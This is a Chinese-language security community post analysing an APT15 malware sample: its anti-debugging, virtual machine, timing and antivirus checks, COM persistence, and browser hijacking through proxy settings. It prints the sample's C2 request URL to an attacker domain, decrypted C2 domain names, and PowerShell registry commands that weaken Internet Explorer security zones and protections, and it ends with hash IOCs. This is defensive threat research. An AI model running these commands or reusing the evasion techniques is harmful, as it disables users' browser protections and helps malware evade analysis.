

# APT15 技术手段分析 - 先知社区

APT15 技术手段分析

- - -

[![](assets/1708870396-6c7334ecee8462da2f079f2a57062ab3.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092742-686969ba-d058-1.jpeg)

  APT15 组织具备完善的反侦查手段，如 PEB 结构/进程检测和 Int3 异常调试状态，也有虚拟机检测，反杀软等目标化工程，本篇技术分析主要对检测技术和劫持分析。

### 样本分析

#### 反调试

fs:0x30->PEB.NtGlobalFlag(0x68) 如果等于 0x70 意味着调试状态，如下所示：

[![](assets/1708870396-c9138f4ebc876c45595474ca31899b01.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092747-6b61719e-d058-1.png)

Int3 反调试，如下所示：

[![](assets/1708870396-2ddb806b6710be39ec948af71ead3027.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092749-6cf53a40-d058-1.png)

OD 进程检测

[![](assets/1708870396-b22b7f5ce07cc1a3235c1b69d5ec912c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092753-6ef051ea-d058-1.png)

动态获取 WinHttpApi

[![](assets/1708870396-8fd066ddfe00b80556627e42dd368d4f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092756-70d167c4-d058-1.png)

C2 请求报文特征，内存解密数据如下所示：

[![](assets/1708870396-616be15866f27cab06051b8565061363.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092758-72404d8c-d058-1.png)

[![](assets/1708870396-83cd51d76223ca5cff22c999841c9b17.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092801-73dac3a2-d058-1.png)

#### 虚拟机检测

[![](assets/1708870396-2a22b8dac57004ab259c0e7802ac1222.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092804-75d89a58-d058-1.png)

实际物理内存检测，如果小于 0x8000000000 内存中止程序。

[![](assets/1708870396-78e45d6de924933d400d5f98620c57c2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092810-7919447e-d058-1.png)

创建互斥体，创建分发线程等待事件结束退出。

[![](assets/1708870396-942a7b896087edafb04a1bf7b0b020a6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092853-92ea500a-d058-1.png)

#### 时间检测

[![](assets/1708870396-b031b1455fa599c3ad253bba303a2ae3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092817-7d3f26fe-d058-1.png)

梳理如下

[![](assets/1708870396-c696609d527a8d088ecbc54e56d3c1cb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092823-8131a0f2-d058-1.png)

#### 杀软检测

系统信息采集，包含主机/用户名/权限，拼接释放路径检测是否有 360tray.exe/wireshark.exe 运行，如下所示

[![](assets/1708870396-b353f2ab7e7574e16e182eabdb198567.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092908-9bae6bae-d058-1.png)

[![](assets/1708870396-667fb677bddcc1ed9813e721d37c49e0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092911-9d6ec6c8-d058-1.png)

创建线程用于持久化操作，利用 Com 接口完成：

[![](assets/1708870396-1b4c68a13af75049811fc4524376ae90.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092913-9ee2b456-d058-1.png)

再次检测 360/Wirsharek 进程，确保无误后进入下一步操作

[![](assets/1708870396-7bb98130da651f608ae0a9a71a0f3c69.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092916-a092eece-d058-1.png)

#### 浏览器劫持

检测系统安装浏览器，如果是指定浏览器，退出

[![](assets/1708870396-0939a6659ddee64fe3152b900395699c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092920-a3072080-d058-1.png)

设置不检查 Internet Explorer 是否为默认浏览器。

[![](assets/1708870396-5782b0b7c6bfc91841cc7e1371c129d8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092923-a4772bea-d058-1.png)

  设置代理，利用 Com 接口请求代理服务器，通过 server\_ver，remark，search 等标识来识别来自于客户端请求，如下所示：

```plain
http://www.apecdns.asia/Users/login.asp?type=query&server_ver=V21&remark=OLEdrv&search=3991
```

[![](assets/1708870396-2dc95ef7133d52a5f7be0015caab1a93.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092926-a68387e4-d058-1.png)

[![](assets/1708870396-613f5f6f7fed1eefce8210c2bf5850e6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092928-a7e0e9a6-d058-1.png)

对无效站点证书关闭警告，如下图所示：

[![](assets/1708870396-88f29f8b8dd72e5cde00a20fde70a67e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092931-a9a3e568-d058-1.png)

数据通信编码 base64，部分已经更换成 AES

[![](assets/1708870396-f58faad47de2d949edaa1ceaef27e811.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092933-aae99260-d058-1.png)

  利用 Com 接口执行 Http 请求，将指令封装至报文中，如&Cmd，=101/102 用来获取对应的功能指令，部分功能如下：

下载文件执行

[![](assets/1708870396-fdbe1e121b3d90ea8b5b3cb4dbfe203a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092936-acb5a840-d058-1.png)

释放 vbs 执行

[![](assets/1708870396-7cdee596b63db3737d2b2b53a21ffba7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092940-aee9259c-d058-1.png)

[![](assets/1708870396-6e1bce75a3bcb2b5716dcb0a10852559.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092942-b0606750-d058-1.png)

数据保存

[![](assets/1708870396-4f91057ebba0e7c0ae3eaebf64201c8e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092946-b29c10e6-d058-1.png)

另一种网络劫持手段，内存解密域名如下：

```plain
press|press.premlist.com|upgrade.aspx|index.aspx|newinfo.aspx|draft.aspx|contexts.aspx|views.aspx|chart.aspx|channels.aspx|global.aspx
```

[![](assets/1708870396-b9556de63ce39790ff156d886c9b50ba.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092950-b4ca8e4c-d058-1.png)

请求键值 Domain/Host，查询和设置代理

[![](assets/1708870396-3e7c263d44b8ccd915f9df4468ed87d1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092953-b65873c8-d058-1.png)

内存解密 Powershell，执行如下：

[![](assets/1708870396-c2a4acb02fb86e42a164b41abf1fbe0e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240221092956-b8267c2c-d058-1.png)

```plain
powershell -command 
"&{New-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -Property DWORD -name WarnonZoneCrossing -value 0 -Force}"
```

```plain
powershell -command 
"&{New-ItemProperty' HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap' -Property DWORD -name IEHarden -value 0 -Force}"..
```

```plain
powershell -command 
"&{New-ItemProperty 'HKCU:\Software\Microsoft\Internet Explorer\PhishingFilter' -Property DWORD -name Enabled -value 1 -Force}"
```

```plain
powershell -command 
"&{New-ItemProperty 'HKCU:\Software\Microsoft\Internet Explorer\PhishingFilter' -Property DWORD -name ShownVerifyBalloon -value 3 -Force}"
```

```plain
powershell -command 
"&{New-ItemProperty 'HKCU:\Software\Microsoft\Internet Explorer\Main' -Property String -name Check_Associations -value 'no' -Force}"
```

```plain
powershell -command 
"&{New-ItemProperty 'HKCU:\Software\Microsoft\Internet Explorer\Main' -Property DWORD -name DEPOff -value 1-Force}"
```

```plain
powershell -command 
"&{New-ItemProperty 'HKCU:\Software\Microsoft\Internet Explorer\Recovery' -Property DWORD -name AutoRecover-value 2 -Force}"
```

```plain
powershell -command 
"&{New-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3' -Property DWORD -name 2500 -value 3 -Force}"
```

### IOCs

```plain
03a2f5ea0cea83e77770a4018c4469ab
7d584187e33f58f57d08becf3cc75b72
9ad5ad17c08632493dfbacb3be84dc21
c79b60e5e923f5fde2a02991238ae688
ff49b26664070b080d30d824bd2f3064
```
